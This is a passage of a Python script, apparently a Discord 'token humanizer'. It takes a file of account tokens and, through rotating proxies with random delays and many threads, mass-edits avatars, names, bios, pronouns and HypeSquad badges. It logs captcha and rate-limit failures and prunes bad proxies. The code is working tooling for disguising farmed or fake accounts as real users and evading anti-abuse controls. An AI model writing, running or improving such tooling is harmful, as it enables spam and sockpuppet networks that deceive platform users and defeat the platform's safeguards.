            time.sleep(random.uniform(0, 3))
            hi = random.choice([1, 2, 3])
            parallel_tasks.append(('hypesquad', (hi, HYPESQUAD_HOUSES[hi])))

        if parallel_tasks:
            def _run_field(task_type, value):
                if getattr(self, 'is_locked', False):
                    return (task_type, {'success': False, 'error': 'Token Locked'}, value)
                h = headers.copy()
                if task_type == 'account':
                    pl, _, _ = value
                    res = self.update_account_sync(pl) if 'avatar' in pl else self.update_user_profile(pl, h)
                    return ('account', res, value)
                elif task_type == 'profile':
                    pl, _, _ = value
                    return ('profile', self.update_profile_fields(pl, h), value)
                elif task_type == 'hypesquad':
                    hid, _ = value
                    return ('hypesquad', self.set_hypesquad(hid, h), value)
                return ('unknown', {'success': False, 'error': 'Unknown field type'}, value)

            with ThreadPoolExecutor(max_workers=len(parallel_tasks)) as fe:
                futures = [fe.submit(_run_field, tt, val) for tt, val in parallel_tasks]
                for future in as_completed(futures):
                    try:
                        task_type, result, values = future.result()
                    except Exception as e:
                        log('FAILED', self.token, f'[Field Error : {str(e)[:30]}]')
                        success = False
                        continue

                    if task_type == 'account':
                        _, aname, dname = values
                        if result['success']:
                            if aname:
                                log('SUCCESS', self.token, f'[Avatar Updated : {aname}]')
                            if dname:
                                log('SUCCESS', self.token, f'[Name Updated : {dname}]')
                        else:
                            if result.get('captcha'):
                                if aname:
                                    log('WARN', self.token, '[Avatar Failed : Captcha]')
                                if dname:
                                    log('WARN', self.token, '[Name Failed : Captcha]')
                                success = False
                            elif result.get('rate_limited'):
                                ra_str = f"{int(result.get('retry_after', 0))}s" if result.get('retry_after') else 'unknown'
                                if aname:
                                    log('WARN', self.token, f'[Avatar Failed : Rate Limited ({ra_str})]')
                                if dname:
                                    log('WARN', self.token, f'[Name Failed : Rate Limited ({ra_str})]')
                                success = False
                            else:
                                err = self._clean_error(result.get('error', 'Unknown'))
                                if aname:
                                    log('FAILED', self.token, f'[Avatar Failed : {err}]')
                                if dname:
                                    log('FAILED', self.token, f'[Name Failed : {err}]')
                                success = False

                    elif task_type == 'profile':
                        _, bname, pname = values
                        if result['success']:
                            if bname:
                                log('SUCCESS', self.token, f"[Bio Updated : {bname[:40]}{'...' if len(bname) > 40 else ''}]")
                            if pname:
                                log('SUCCESS', self.token, f'[Pronouns Updated : {pname}]')
                        else:
                            if result.get('captcha'):
                                if bname:
                                    log('WARN', self.token, '[Bio Failed : Captcha]')
                                if pname:
                                    log('WARN', self.token, '[Pronouns Failed : Captcha]')
                                success = False
                            else:
                                err = self._clean_error(result.get('error', 'Unknown'))
                                if bname:
                                    log('FAILED', self.token, f'[Bio Failed : {err}]')
                                if pname:
                                    log('FAILED', self.token, f'[Pronouns Failed : {err}]')
                                success = False

                    elif task_type == 'hypesquad':
                        _, hsname = values
                        if result.get('success'):
                            applied = result.get('house_name', hsname)
                            tag = 'Already Set' if result.get('already_set') else 'Updated'
                            level = 'INFO' if result.get('already_set') else 'SUCCESS'
                            log(level, self.token, f'[HypeSquad {tag} : {applied}]')
                        else:
                            err = self._clean_error(result.get('error', 'Unknown'))
                            log('FAILED', self.token, f'[HypeSquad Failed : {hsname} - {err}]')
                            success = False

        if self.proxy_failed and proxy_manager:
            proxy_manager.mark_bad(self.proxy)

        with stats_lock:
            if success:
                append_to_file(SUCCESS_FILE, self.token)
                remove_token_from_file(TOKENS_FILE, self.token)
                stats['success'] += 1
            else:
                append_to_file(FAILED_FILE, self.token)
                stats['failed'] += 1

        return success


def process_token(token, names, bios, pronouns_list, avatar_files, avatar_loader) -> bool:
    proxy = proxy_manager.get_proxy() if proxy_manager else None
    humanizer = Humanizer(token, proxy)
    try:
        return humanizer.process(names, bios, pronouns_list, avatar_files, avatar_loader)
    finally:
        if proxy_manager and proxy:
            proxy_manager.release_proxy(proxy)


def main():
    global MAX_THREADS, proxy_manager, _title_done

    display_banner()

    title_thread = threading.Thread(target=_title_loop, daemon=True)
    title_thread.start()

    try:
        log.input(f"How many threads? (Default: {MAX_THREADS}):")
        ti = input().strip()
        if ti:
            MAX_THREADS = int(ti)
    except ValueError:
        log.warning(f'Invalid thread count. Using default: {MAX_THREADS}')

    for d in [DATA_DIR, INPUT_DIR, AVATARS_DIR, BANNERS_DIR]:
        d.mkdir(parents=True, exist_ok=True)

    tokens = load_tokens(TOKENS_FILE)
    if not tokens:
        log.fail(f'No valid tokens found in {TOKENS_FILE}')
        return

    with stats_lock:
        stats['total'] = len(tokens)

    proxy_lines = load_file_lines(PROXIES_FILE)
    proxies = [p for p in (parse_proxy(l) for l in proxy_lines) if p]
    if proxies:
        proxy_manager = ProxyManager(proxies)

    names = load_file_lines(NAMES_FILE)
    bios = load_file_lines(BIOS_FILE)
    pronouns_list = load_file_lines(PRONOUNS_FILE)
    avatar_files = load_avatar_files()

    _av_lock = threading.Lock()
    _av_cache = {}

    def lazy_get_avatar(path: Path) -> Optional[str]:
        with _av_lock:
            if path in _av_cache:
                return _av_cache[path]
        b64 = load_avatar_as_base64(path)
        if b64:
            with _av_lock:
                if len(_av_cache) >= MAX_AVATAR_CACHE:
                    try:
                        del _av_cache[next(iter(_av_cache))]
                    except StopIteration:
                        pass
                _av_cache[path] = b64
        return b64

    log.inf(f"Total tokens loaded -> count= {len(tokens)}")
    if proxies:
        log.inf(f"Total proxies loaded -> count= {len(proxies)}")
    if avatar_files:
        log.inf(f"Total avatars loaded -> count= {len(avatar_files)}")
    log.inf(f"Starting with {MAX_THREADS} threads")
    print()
    SUCCESS_FILE.write_text('')
    FAILED_FILE.write_text('')

    token_iter = iter(tokens)
    active_futures = set()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for token in token_iter:
            if len(active_futures) >= MAX_THREADS:
                break
            future = executor.submit(process_token, token, names, bios, pronouns_list, avatar_files, lazy_get_avatar)
            future._token = token
            active_futures.add(future)

        while active_futures:
            done, _ = wait(active_futures, return_when=FIRST_COMPLETED)
            for future in done:
                active_futures.remove(future)
                try:
                    future.result()
                except Exception as e:
                    log('FAILED', getattr(future, '_token', 'Unknown'), f'Unexpected error: {str(e)[:50]}')
                try:
                    token = next(token_iter)
                    new_future = executor.submit(process_token, token, names, bios, pronouns_list, avatar_files, lazy_get_avatar)
                    new_future._token = token
                    active_futures.add(new_future)
                except StopIteration:
                    pass

    _title_done = True
    elapsed = time.time() - stats['start_time']
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)

    dim = "\033[38;5;240m"
    gray = "\033[38;5;245m"
    white = "\033[38;5;255m"
    green = "\033[38;5;120m"
    red = "\033[38;5;203m"
    cyan = "\033[38;5;75m"
    reset = "\033[0m"

    print()
    log.log_line('/', log.INFO, f"{white}Minutes {dim}-> {gray}count= {reset}{cyan}{minutes}{reset}{gray}, {white}Seconds {dim}-> {gray}count= {reset}{cyan}{seconds}{reset}")
    log.log_line('/', log.INFO, f"{white}Total {dim}-> {gray}count= {reset}{cyan}{stats['total']}{reset}")
    log.log_line('+', log.SUCCESS, f"{white}Success {dim}-> {gray}count= {reset}{green}{stats['success']}{reset}")
    log.log_line('-', log.FAIL, f"{white}Failed {dim}-> {gray}count= {reset}{red}{stats['failed']}{reset}")
    if proxy_manager:
        ps = proxy_manager.get_stats()
        log.log_line('/', log.INFO, f"{white}Proxies {dim}-> {green}{ps['active']}{dim} good / {red}{ps['bad']}{dim} bad{reset}")

    if proxy_manager and proxy_manager.bad_proxies:
        proxy_lines = load_file_lines(PROXIES_FILE)
        cleaned = [p for p in proxy_lines if parse_proxy(p) not in proxy_manager.bad_proxies]
        PROXIES_FILE.write_text('\n'.join(cleaned) + '\n')
        log.inf(f'Removed {len(proxy_lines) - len(cleaned)} bad proxies from proxies.txt')

    log.input("Press Enter to exit")
    wait_for_enter()


if __name__ == '__main__':
    main()